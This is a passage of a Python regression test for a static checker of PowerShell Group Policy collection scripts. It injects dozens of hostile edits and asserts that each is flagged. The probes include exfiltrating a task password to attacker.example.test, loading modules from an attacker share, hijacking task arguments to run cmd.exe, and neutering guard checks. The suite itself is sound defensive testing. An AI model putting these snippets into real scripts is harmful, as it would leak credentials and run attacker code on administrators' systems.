            "if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint))",
            "if (-not $root.PSIsContainer -and ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint))",
        ),
    ),
    # Sol BL-1: move the guard after the delete/create it protects.
    (
        "r3_reorder_guard_after_open",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "    if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint)) {\n"
            "        throw 'Registration refuses a linked output root.'\n"
            "    }\n"
            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n"
            "    # File.Delete unlinks this directory entry; it never writes through a link.\n"
            "    # CreateNew refuses an object substituted between deletion and creation.\n"
            "    [IO.File]::Delete($marker)\n"
            "    $stream = [IO.File]::Open($marker, [IO.FileMode]::CreateNew, "
            "[IO.FileAccess]::Write, [IO.FileShare]::None)\n",
            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n"
            "    [IO.File]::Delete($marker)\n"
            "    $stream = [IO.File]::Open($marker, [IO.FileMode]::CreateNew, "
            "[IO.FileAccess]::Write, [IO.FileShare]::None)\n"
            "    if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint)) {\n"
            "        throw 'Registration refuses a linked output root.'\n"
            "    }\n",
        ),
    ),
    # DeepSeek NEW-BL-1: $PSDefaultParameterValues injects -CimSession into the
    # pinned Register-ScheduledTask call (and parameters anywhere else).
    (
        "r3_psdefault_register_cimsession",
        "Register-GpoLensCollection.ps1",
        "before",
        (
            "function ConvertTo-GpoLensTaskArgument",
            "$PSDefaultParameterValues['Register-ScheduledTask:CimSession'] = "
            "'server.example.test'\n",
        ),
    ),
    (
        "r3_psdefault_export",
        "Export-GpoEstate.ps1",
        "append",
        "$PSDefaultParameterValues['Get-GPOReport:Path'] = "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\overwritten.xml'\n",
    ),
    (
        "r3_psdefault_run",
        "Run-GpoLensCollection.ps1",
        "append",
        "$PSDefaultParameterValues['Remove-Item:Recurse'] = $true\n",
    ),
    # DeepSeek NEW-BL-2: retention guard moved after the recursive delete.
    (
        "r3_reorder_retention_guard",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "            Assert-GpoLensRegularTree -Root $folder\n"
            "            Remove-Item -LiteralPath $archive.FullName -Force\n"
            "            Remove-Item -LiteralPath $folder -Recurse -Force\n",
            "            Remove-Item -LiteralPath $archive.FullName -Force\n"
            "            Remove-Item -LiteralPath $folder -Recurse -Force\n"
            "            Assert-GpoLensRegularTree -Root $folder\n",
        ),
    ),
    # DeepSeek NEW-BL-3 / NON-BL-2: computed common-parameter variable names.
    (
        "r3_outvariable_computed",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable ('Output' + 'Root') | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r3_outvariable_indirect_var",
        "Export-GpoEstate.ps1",
        "append",
        "$n = 'OutputRoot'\n"
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable $n | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r3_errorvariable_computed",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\gate-missing' -ErrorVariable ('Log' + 'Path') "
        "-ErrorAction SilentlyContinue | Out-Null\n",
    ),
    (
        "r3_outvariable_braced",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable ${OutputRoot} | Out-Null\n",
    ),
    # DeepSeek NON-BL-1 / NON-BL-5: a member call's later argument changed.
    (
        "r3_member_later_argument",
        "Export-GpoEstate.ps1",
        "replace",
        (
            '[System.IO.File]::WriteAllText($testFile, "test")',
            '[System.IO.File]::WriteAllText($testFile, "owned")',
        ),
    ),
    (
        "r3_marker_open_mode",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::Read, "
            "[IO.FileShare]::Read)",
            "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite, "
            "[IO.FileShare]::Read)",
        ),
    ),
    # --- Same classes, found while fixing round 3 (also accepted at d1d4bef) ---
    # A root read by a pinned binding was itself unpinned.
    (
        "r4_marker_root_rebind",
        "GpoLensCollectionMarker.ps1",
        "append",
        "$root = Get-Item -LiteralPath '\\\\dc.example.test\\SYSVOL\\example.test\\Policies'\n",
    ),
    # A local function's root parameter bound at a new call site.
    (
        "r4_callsite_marker_root",
        "Register-GpoLensCollection.ps1",
        "append",
        "Write-GpoLensOwnerMarkerBytes -OutputRoot "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies' -Bytes ([byte[]](65))\n",
    ),
    (
        "r4_callsite_log_path",
        "Run-GpoLensCollection.ps1",
        "append",
        "Write-GpoLensCollectionLog -LogPath 'C:\\Windows\\System32\\evil.log' -Message 'x' "
        "-LogMaxBytes 1024 -LogFiles 1\n",
    ),
    # Multiple assignment and a filesystem-drive variable write.
    (
        "r4_multi_assignment_root",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot, $gateCount = 'C:\\Windows\\System32', 1\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r4_drive_variable_write",
        "Export-GpoEstate.ps1",
        "append",
        "${C:\\Windows\\Temp\\gate.txt} = 'owned'\n",
    ),
    (
        "r4_env_psmodulepath",
        "Export-GpoEstate.ps1",
        "append",
        "$env:PSModulePath = '\\\\attacker.example.test\\share'\n",
    ),
    # ForEach-Object invoking a method by name.
    (
        "r4_foreach_object_member",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml' "
        "| ForEach-Object Delete\n",
    ),
    # A guard function redefined as a no-op before the entry point runs.
    (
        "r4_guard_function_redefined",
        "Run-GpoLensCollection.ps1",
        "before",
        ("if ($MyInvocation.InvocationName -ne '.')", "function Assert-GpoLensRegularTree { }\n"),
    ),
    # Child data in a pinned write-target expression rebound.
    (
        "r4_safe_name_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$safe = '..\\..\\..\\Windows\\System32\\evil'\n",
    ),
    # [ref] hands a pinned root to a writer.
    (
        "r4_ref_rebind_root",
        "Run-GpoLensCollection.ps1",
        "append",
        "[guid]::TryParse('x', [ref]$OutputRoot) | Out-Null\n",
    ),
    # --- Round-4 candidates (Sol; DeepSeek helper class), each previously accepted ---
    # Sol BL-1: a helper's emitted value changed to an outside-root FileInfo,
    # which the pinned catch-path Remove-Item then deletes.
    (
        "r4s_helper_returns_outside_file",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "if ($zip.GetEntry('AllGPOs.xml')) { $archive }",
            "if ($zip.GetEntry('AllGPOs.xml')) { Get-Item -LiteralPath "
            "'C:\\Windows\\System32\\drivers\\etc\\hosts' }",
        ),
    ),
    # Sol BL-2: the task-argument helper returns a constant UNC -File target.
    (
        "r4s_task_quote_helper_remote_script",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'",
            "return '\"\\\\attacker.example.test\\share\\Mutate-Domain.ps1\"'",
        ),
    ),
    # DeepSeek round 4: the same helper class.
    (
        "r4d_helper_taskarg_append",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'\n",
            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\" & calc'\n",
        ),
    ),
    (
        "r4d_helper_abspath_change",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    return [IO.Path]::GetFullPath($Value)\n",
            "    return 'C:\\Windows\\Temp\\hijacked'\n",
        ),
    ),
    # Sol BL-3: the collection lock released before the protected block.
    (
        "r4s_early_lock_dispose",
        "Run-GpoLensCollection.ps1",
        "before",
        (
            "    $logArgs = @{LogPath=(Join-Path $OutputRoot 'collection.log');",
            "    $lock.Dispose()\n",
        ),
    ),
    # Sol NB-1: a write helper called outside its caller's guard.
    (
        "r4s_caller_guard_duplicate_marker_write",
        "Register-GpoLensCollection.ps1",
        "before",
        (
            "if ($MyInvocation.InvocationName -ne '.')",
            "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot "
            "-Bytes ([Text.UTF8Encoding]::new($false).GetBytes($TaskName))\n",
        ),
    ),
    # Sol NB-3: a rejected Add-Type form must be a check failure, not a crash.
    (
        "r4s_add_type_path",
        "Export-GpoEstate.ps1",
        "append",
        "Add-Type -Path 'C:\\reviewer-evil.dll'\n",
    ),
    # Sol NB-2: CR bytes inside the existing here-string (old golden: SAME).
    (
        "r4s_here_string_crlf",
        "GpoLensCollectionMarker.ps1",
        "replace",
        ("namespace GpoLens {\n", "namespace GpoLens {\r\n"),
    ),
    # Cross-repo class 2: a ForEach-Object / Where-Object / .ForEach()
    # scriptblock runs in the caller's scope, so an unqualified assignment in it
    # rebinds the caller's pinned variable.
    (
        "r4x_foreach_object_scope_rebind",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-ChildItem -LiteralPath $OutputRoot | ForEach-Object { $OutputRoot = 'C:\\Windows' }\n",
    ),
    (
        "r4x_where_object_scope_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "Get-ChildItem -LiteralPath $OutputRoot | "
        "Where-Object { ($dest = 'C:\\Windows\\System32') }\n",
    ),
    (
        "r4x_intrinsic_foreach_scope_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "@(1).ForEach({ $OutputRoot = 'C:\\Windows' })\n",
    ),
    # Per-scope pinning: an existing pinned binding copied into another function.
    (
        "r4x_scope_moved_binding",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "    param([string]$Marker)\n",
            "    param([string]$Marker)\n"
            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n",
        ),
    ),
    # Cross-repo class 1: re-cased command / method / parameter names.
    (
        "r4x_case_new_object_com",
        "Export-GpoEstate.ps1",
        "append",
        "nEw-ObJeCt -comobject 'WScript.Shell'\n",
    ),
    (
        "r4x_case_remove_item_duplicate",
        "Run-GpoLensCollection.ps1",
        "append",
        "remove-item -literalpath $folder -recurse -force\n",
    ),
    (
        "r4x_case_lifetime_dispose",
        "Run-GpoLensCollection.ps1",
        "before",
        (
            "    $logArgs = @{LogPath=(Join-Path $OutputRoot 'collection.log');",
            "    $LOCK.dispose()\n",
        ),
    ),
    # --- DeepSeek round 4 NEW-BLOCKING-1 (helper and guard bodies) ---
    (
        "r4d_helper_taskarg_hijack",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'\n",
            "    return '\"C:\\\\Windows\\\\System32\\\\cmd.exe\" /c whoami'\n",
        ),
    ),
    (
        "r4d_helper_early_return_getcompleted",
        "Run-GpoLensCollection.ps1",
        "before",
        (
            "    $candidates = @(Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' "
            "-ErrorAction Stop |",
            "    return (Get-Item -LiteralPath 'C:\\Windows\\Temp\\evil.zip')\n",
        ),
    ),
    (
        "r4d_guardbody_assert_regular_tree",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "        if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) {\n"
            "            throw 'Retention refuses a linked export folder or file.'\n"
            "        }\n"
            "        foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force)) {\n"
            "            if ($child.Attributes -band [IO.FileAttributes]::ReparsePoint) {\n"
            "                throw 'Retention refuses a linked export folder or file.'\n"
            "            }\n",
            "        foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force)) {\n",
        ),
    ),
    (
        "r4d_helper_owner_guard_neutered",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "    if (-not [string]::Equals($owner, $TaskName, "
            "[StringComparison]::OrdinalIgnoreCase)) {\n"
            '        throw "Collection refuses output root owner',
            '    if ($false) {\n        throw "Collection refuses output root owner',
        ),
    ),
    (
        "r4d_helper_entry_change",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "            if ($zip.GetEntry('AllGPOs.xml')) { $archive }",
            "            if ($zip.GetEntry('evil.xml')) { $archive }",
        ),
    ),
    (
        "r4d_helper_marker_linkcount_neutered",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "        if ($links -ne 1) { throw 'Collection refuses a linked owner marker.' }\n",
            "        if ($links -ne 1) { Write-Warning 'link count ignored' }\n",
        ),
    ),
    (
        "r4d_helper_filter_change",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' -ErrorAction Stop |",
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.*' -ErrorAction Stop |",
        ),
    ),
    (
        "r4d_guardbody_owner_guard_return",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "        throw 'Registration refuses a linked output root.'\n",
            "        Write-Warning 'skip linked output root'\n",
        ),
    ),
    # DeepSeek NON-BLOCKING-1: a static call on a computed type must be a clean
    # check failure (it crashed _write_targets at 64411db).
    (
        "r4d_static_computed_type",
        "Export-GpoEstate.ps1",
        "append",
        "$t = [IO.File]\n$t::Delete('C:\\Windows\\Temp\\x')\n",
    ),
    # DeepSeek NON-BLOCKING-3: a UTF-8 BOM (old golden: SAME; digest was of
    # BOM-stripped text).
    ("r4d_bom", "Export-GpoEstate.ps1", "prepend", "\ufeff"),
    # --- Round-5 candidates (Sol), each previously accepted ---
    # B1: an extra allowlisted output/read command exfiltrates the password.
    (
        "r5s_credential_console_exfil",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
            '        Write-Host "captured=$taskPassword"\n',
        ),
    ),
    (
        "r5s_credential_unc_exfil",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
            '        Get-Item -LiteralPath "\\\\attacker.example.test\\share\\$taskPassword" '
            "| Out-Null\n",
        ),
    ),
    (
        "r5s_arbitrary_unc_read",
        "Export-GroupMembers.ps1",
        "append",
        "Get-Content -LiteralPath '\\\\attacker.example.test\\share\\payload.txt' | Write-Host\n",
    ),
    # Same class: a copy of the secret to another variable (no new command).
    (
        "r5x_secret_copy",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n",
            "        $taskPassword = $Credential.GetNetworkCredential().Password\n"
            "        $gateLeak = $taskPassword\n",
        ),
    ),
    # Non-blocking: ShouldProcess turned off in the script header.
    (
        "r5s_shouldprocess_false",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "[CmdletBinding(SupportsShouldProcess, DefaultParameterSetName = 'Gmsa')]",
            "[CmdletBinding(SupportsShouldProcess=$false, DefaultParameterSetName = 'Gmsa')]",
        ),
    ),
    # B2: the task-name validator removed again.
    (
        "r5s_taskname_validator_removed",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    [ValidatePattern('^[A-Za-z0-9][A-Za-z0-9 ._-]{0,199}$')]\n"
            "    [string]$TaskName = 'GpoLensCollection',",
            "    [string]$TaskName = 'GpoLensCollection',",
        ),
    ),
    # --- Round-6 candidates (Sol), each previously accepted ---
    # 1: a command-argument variable rebound to a remote path.
    (
        "r6s_remote_read_by_argument_rebind",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "    $metaPath = Join-Path $out 'gpo-metadata.json'\n",
            "    $metaPath = Join-Path $out 'gpo-metadata.json'\n"
            "    $metaPath = '\\\\attacker.example.test\\share\\payload.json'\n",
        ),
    ),
    # 2: guard-predicate variables rebound.
    (
        "r6s_force_unregister_by_guard_rebind",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "    $ErrorActionPreference = 'Stop'\n",
            "    $ErrorActionPreference = 'Stop'\n    $Unregister = $true\n",
        ),
    ),
    (
        "r6s_force_real_run_by_guard_rebind",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "$ErrorActionPreference = 'Stop'\n",
            "$ErrorActionPreference = 'Stop'\n$DryRun = $false\n",
        ),
    ),
    (
        "r6s_silently_skip_sysvol_by_guard_rebind",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "$ErrorActionPreference = 'Stop'\n",
            "$ErrorActionPreference = 'Stop'\n$SkipSysvol = $true\n",
        ),
    ),
    # Same class: remote-looking literals bound to a variable anywhere.
    (
        "r6x_remote_literal_expandable",
        "Run-GpoLensCollection.ps1",
        "append",
        '$gateShare = "\\\\$env:COMPUTERNAME\\c$\\gate"\n',
    ),
    (
        "r6x_remote_literal_url",
        "Export-Principals.ps1",
        "append",
        "$gateUrl = 'https://attacker.example.test/payload'\n",
    ),
    # --- DeepSeek round 5 BL-1: 2-char prefix -Pi of -PipelineVariable ---
    (
        "r5d_pi_rebind_dest_copy",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "            Copy-Item -LiteralPath $pf.FullName -Destination $dest -Recurse -Force "
            "-ErrorAction Stop\n",
            "            Get-Item -LiteralPath 'C:\\Windows\\Temp' -Pi dest | "
            "Copy-Item -LiteralPath $pf.FullName -Destination $dest -Recurse -Force "
            "-ErrorAction Stop\n",
        ),
    ),
    (
        "r5d_pi_only_getitem",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath '/etc/hostname' -Pi knownIds | Out-Null\n",
    ),
    (
        "r5d_pi_rebind_receiver",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '/etc/hostname' -Pi stream | Out-Null\n",
    ),
    (
        "r5d_pi_rebind_out_before_write",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "$allGpos = Get-GPO -All\n",
            "Get-Item -LiteralPath '/etc/hostname' -Pi out | Out-Null\n$allGpos = Get-GPO -All\n",
        ),
    ),
    # Alias form of the same class.
    (
        "r5d_ov_alias_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath '/etc/hostname' -ov OutputRoot | Out-Null\n",
    ),
    # DeepSeek round-5 NB-3: a parameter that no real cmdlet parameter matches.
    (
        "r5d_unknown_parameter",
        "Export-GpoEstate.ps1",
        "append",
        "Get-ChildItem -LiteralPath 'C:\\x' -OutFile 'C:\\Windows\\Temp\\y'\n",
    ),
    # --- Round-7 candidates (Sol), each previously accepted ---
    # 1: an extra allowlisted read method with a computed UNC path.
    (
        "r7s_computed_unc_readallbytes",
        "Run-GpoLensCollection.ps1",
        "append",
        "[void][IO.File]::ReadAllBytes("
        "(-join ([char]92, [char]92, 'attacker.example.test\\share\\payload.bin')))\n",
    ),
    # 2: expression-only pipeline input injecting a remote SYSVOL copy source.
    (
        "r7s_pipeline_injected_sysvol_source",
        "Export-GpoEstate.ps1",
        "replace",
        (
            "    Get-ChildItem -LiteralPath $src -File -ErrorAction SilentlyContinue |\n",
            "    (@([pscustomobject]@{ Name = 'payload.pol'; FullName = "
            "(-join ([char]92, [char]92, 'attacker.example.test\\share\\payload.pol')) }) + "
            "@(Get-ChildItem -LiteralPath $src -File -ErrorAction SilentlyContinue)) |\n",
        ),
    ),
    # 3: an extra allowlisted collection mutation suppressing a coverage gap.
    (
        "r7s_suppress_coverage_gap_with_add",
        "Export-GpoEstate.ps1",
        "append",
        # GUID assembled so tests/test_fixture_guid_lint.py sees no bare literal.
        "[void]$knownIds.Add('" + "-".join(("1" * 8, "1" * 4, "1" * 4, "1" * 4, "1" * 12)) + "')\n",
    ),
    # --- Round-8 candidates (Sol): implicit construction / side-effecting getters ---
    (
        "r8s_implicit_streamwriter",
        "Run-GpoLensCollection.ps1",
        "append",
        "$null = [System.IO.StreamWriter]'C:\\Windows\\Temp\\gpo-lens-review.txt'\n",
    ),
    (
        "r8s_implicit_streamreader_unc",
        "Run-GpoLensCollection.ps1",
        "append",
        "$null = [System.IO.StreamReader](-join ([char]92, [char]92, "
        "'attacker.example.test\\share\\payload.bin'))\n",
    ),
    (
        "r8s_fileinfo_length_unc",
        "Run-GpoLensCollection.ps1",
        "append",
        "$null = ([System.IO.FileInfo](-join ([char]92, [char]92, "
        "'attacker.example.test\\share\\payload.bin'))).Length\n",
    ),
    (
        "r8s_directoryinfo_exists_unc",
        "Run-GpoLensCollection.ps1",
        "append",
        "$null = ([System.IO.DirectoryInfo](-join ([char]92, [char]92, "
        "'attacker.example.test\\share'))).Exists\n",
    ),
    # --- DeepSeek round 9: -as conversion operator bypasses the cast check ---
    (
        "r9d_as_streamwriter",
        "Run-GpoLensCollection.ps1",
        "append",
        "$null = 'C:\\Windows\\Temp\\gpo-lens-review.txt' -as [System.IO.StreamWriter]\n",
    ),
    (
        "r9d_as_streamreader_unc",
        "Run-GpoLensCollection.ps1",
        "append",
        "$null = (-join ([char]92, [char]92, 'attacker.example.test\\share\\payload.bin')) "
        "-as [System.IO.StreamReader]\n",
    ),
    (
        "r9d_as_computed_type",
        "Run-GpoLensCollection.ps1",
        "append",
        "$gateType = [System.IO.StreamWriter]\n"
        "$null = 'C:\\Windows\\Temp\\gpo-lens-review.txt' -as $gateType\n",
    ),
    # Sol round 9: -as [StreamWriter] creating/truncating a file on a computed UNC.
    (
        "r9s_as_streamwriter_unc",
        "Run-GpoLensCollection.ps1",
        "append",
        "$null = (-join ([char]92, [char]92, 'attacker.example.test\\share\\created.bin')) "
        "-as [System.IO.StreamWriter]\n",
    ),
]

# NON-BL-3: the regression suite asserts WHICH substantive check flagged each
# probe, not merely that one did (so a parse error can never masquerade as a
# catch). Maps probe id -> the check name expected to raise.
_PROBE_EXPECTED_CHECK: dict[str, str] = {
    "sol_root_rebind": "pinned_bindings",
    "sol_registry_rebind": "pinned_bindings",
    "sol_set_itemtype": "writes",
    "sol_redirection": "redirections",
    "sol_redirection_stream": "redirections",
    "sol_get_gporeport_path": "writes",
    "sol_instance_delete": "dotnet",
    "sol_adsi_delete": "types",
    "sol_using_module": "usings",
    "sol_collector_rebind": "pinned_bindings",
    "sol_task_abuse": "task_action",
    "ds_writeroot_var": "pinned_bindings",
    "ds_writeroot_run": "pinned_bindings",
    "ds_adsi_copyto_marker": "types",
    "ds_register_args": "task_action",
    "ds_using_assembly": "usings",
    "neg_set_adobject": "commands",
    "neg_adsi_commit": "types",
    "neg_dynamic_member": "dotnet",
    "neg_com": "new_object_and_add_type",
    "neg_namespace_de": "usings",
    "neg_splat_write": "writes",
    "neg_addtype_inline": "new_object_and_add_type",
    "neg_import_module_unc": "commands",
    "r2_outvariable_rebind_root": "pinned_bindings",
    "r2_pipelinevariable_rebind_root": "pinned_bindings",
    "r2_errorvariable_rebind_root": "pinned_bindings",
    "r2_warningvariable_rebind_root": "pinned_bindings",
    "r2_informationvariable_rebind_root": "pinned_bindings",
    "r2_collectorpath_outvariable_override": "pinned_bindings",
    "r2_taskargs_outvariable_override": "pinned_bindings",
    "r2_parenthesized_receiver_delete": "instance_receivers",
    "r2_parenthesized_receiver_open_write": "instance_receivers",
    "r2_parenthesized_fileinfo_copyto_sysvol": "instance_receivers",
    "r2_wmi_remote_instance_delete": "types",
    "r2_taskname_direct_rebind": "pinned_bindings",
    "r2_task_unregister_wildcard": "task_action",
    "r2_task_register_remote_cimsession": "task_action",
    "r2_task_principal_runlevel_highest": "task_action",
    "r2_env_via_second_variable": "writes",
    "r2_dotdot_via_second_variable": "writes",
    "r2_computed_dotdot_via_second_variable": "writes",
    "r2_new_item_name_traversal": "writes",
    "ds_dotdot_child_var": "writes",
    "ds_interp_child": "writes",
    "ds_writealltext_child": "writes",
    "ds_copyitem_child": "writes",
    "ds_getgporeport_child": "writes",
    "ds_function_wrapped_write": "writes",
    "ds_script_scope_outputroot": "pinned_bindings",
    "ds_foreach_abs_root": "pinned_bindings",
    "ds_script_collectorpath": "pinned_bindings",
    "ds_script_windowsroot": "pinned_bindings",
    "ds_script_logpath": "pinned_bindings",
    "r3_receiver_rebind_delete": "pinned_bindings",
    "r3_unregister_duplicate": "guarded_ops",
    "r3_alias_provider": "bindings",
    "r3_requires_module": "ast",
    "r3_guard_or_to_and": "guarded_ops",
    "r3_reorder_guard_after_open": "guarded_ops",
    "r3_psdefault_register_cimsession": "bindings",
    "r3_psdefault_export": "bindings",
    "r3_psdefault_run": "bindings",
    "r3_reorder_retention_guard": "guarded_ops",
    "r3_outvariable_computed": "bindings",
    "r3_outvariable_indirect_var": "bindings",
    "r3_errorvariable_computed": "bindings",
    "r3_outvariable_braced": "bindings",
    "r3_member_later_argument": "guarded_ops",
    "r3_marker_open_mode": "guarded_ops",
    "r4_marker_root_rebind": "pinned_bindings",
    "r4_callsite_marker_root": "pinned_bindings",
    "r4_callsite_log_path": "pinned_bindings",
    "r4_multi_assignment_root": "bindings",
    "r4_drive_variable_write": "bindings",
    "r4_env_psmodulepath": "bindings",
    "r4_foreach_object_member": "commands",
    "r4_guard_function_redefined": "local_functions",
    "r4_safe_name_rebind": "pinned_bindings",
    "r4_ref_rebind_root": "pinned_bindings",
    "r4s_helper_returns_outside_file": "local_function_bodies",
    "r4s_task_quote_helper_remote_script": "local_function_bodies",
    "r4d_helper_taskarg_append": "local_function_bodies",
    "r4d_helper_abspath_change": "local_function_bodies",
    "r4s_early_lock_dispose": "guarded_ops",
    "r4s_caller_guard_duplicate_marker_write": "guarded_ops",
    "r4s_add_type_path": "new_object_and_add_type",
    "r4s_here_string_crlf": "ast",
    "r4x_foreach_object_scope_rebind": "pinned_bindings",
    "r4x_where_object_scope_rebind": "pinned_bindings",
    "r4x_intrinsic_foreach_scope_rebind": "pinned_bindings",
    "r4x_scope_moved_binding": "pinned_bindings",
    "r4x_case_new_object_com": "new_object_and_add_type",
    "r4x_case_remove_item_duplicate": "guarded_ops",
    "r4x_case_lifetime_dispose": "guarded_ops",
    "r4d_helper_taskarg_hijack": "local_function_bodies",
    "r4d_helper_early_return_getcompleted": "local_function_bodies",
    "r4d_guardbody_assert_regular_tree": "local_function_bodies",
    "r4d_helper_owner_guard_neutered": "local_function_bodies",
    "r4d_helper_entry_change": "local_function_bodies",
    "r4d_helper_marker_linkcount_neutered": "local_function_bodies",
    "r4d_helper_filter_change": "local_function_bodies",
    "r4d_guardbody_owner_guard_return": "local_function_bodies",
    "r4d_static_computed_type": "dotnet",
    "r4d_bom": "ast",
    "r5s_credential_console_exfil": "secret_uses",
    "r5s_credential_unc_exfil": "secret_uses",
    "r5s_arbitrary_unc_read": "remote_paths",
    "r5x_secret_copy": "secret_uses",
    "r5s_shouldprocess_false": "script_header",
    "r5s_taskname_validator_removed": "task_name_validator",
    "r6s_remote_read_by_argument_rebind": "pinned_bindings",
    "r6s_force_unregister_by_guard_rebind": "pinned_bindings",
    "r6s_force_real_run_by_guard_rebind": "pinned_bindings",
    "r6s_silently_skip_sysvol_by_guard_rebind": "pinned_bindings",
    "r6x_remote_literal_expandable": "remote_literals",
    "r6x_remote_literal_url": "remote_literals",
    "r5d_pi_rebind_dest_copy": "pinned_bindings",
    "r5d_pi_only_getitem": "pinned_bindings",
    "r5d_pi_rebind_receiver": "pinned_bindings",
    "r5d_pi_rebind_out_before_write": "pinned_bindings",
    "r5d_ov_alias_rebind": "pinned_bindings",
    "r5d_unknown_parameter": "commands",
    "r7s_computed_unc_readallbytes": "guarded_ops",
    "r7s_pipeline_injected_sysvol_source": "pipeline_inputs",
    "r7s_suppress_coverage_gap_with_add": "guarded_ops",
    "r8s_implicit_streamwriter": "cast_types",
    "r8s_implicit_streamreader_unc": "cast_types",
    "r8s_fileinfo_length_unc": "cast_types",
    "r8s_directoryinfo_exists_unc": "cast_types",
    "r9d_as_streamwriter": "cast_types",
    "r9d_as_streamreader_unc": "cast_types",
    "r9d_as_computed_type": "cast_types",
    "r9s_as_streamwriter_unc": "cast_types",
}


def _apply_edit(text: str, mode: str, edit: str | tuple[str, str]) -> str:
    if mode == "append":
        assert isinstance(edit, str)
        return text + "\n" + edit
    if mode == "prepend":
        assert isinstance(edit, str)
        return edit + text
    assert isinstance(edit, tuple)
    anchor, change = edit
    assert text.count(anchor) == 1, f"edit anchor must occur exactly once: {anchor!r}"
    if mode == "before":
        return text.replace(anchor, change + anchor, 1)
    assert mode == "replace", mode
    return text.replace(anchor, change, 1)


def _modified_inventory(
    exe: str,
    base: str,
    position: str,
    snippet: str | tuple[str, str],
    dest: Path,
    extra_files: dict[str, str] | None = None,
) -> dict[str, dict[str, Any]]:
    copy = dest / "scripts"
    copy.mkdir(parents=True, exist_ok=True)
    for name in POLICIES:
        text = (_SCRIPTS / name).read_text(encoding="utf-8")
        if name == base:
            text = _apply_edit(text, position, snippet)
        (copy / name).write_text(text, encoding="utf-8")
    for extra_name, extra_text in (extra_files or {}).items():
        (copy / extra_name).write_text(extra_text, encoding="utf-8")
    return _run_dumper(exe, [str(copy / name) for name in sorted(POLICIES)])


def test_every_probe_has_an_expected_check() -> None:
    ids = {p[0] for p in _REGRESSIONS}
    assert ids == set(_PROBE_EXPECTED_CHECK), (
        "every probe needs an expected check: "
        f"missing {sorted(ids - set(_PROBE_EXPECTED_CHECK))}, "
        f"stale {sorted(set(_PROBE_EXPECTED_CHECK) - ids)}"
    )


@pytest.mark.parametrize("probe", _REGRESSIONS, ids=[p[0] for p in _REGRESSIONS])
def test_reviewer_probes_are_flagged(tmp_path: Path, probe: Probe) -> None:
    probe_id, base, position, snippet = probe
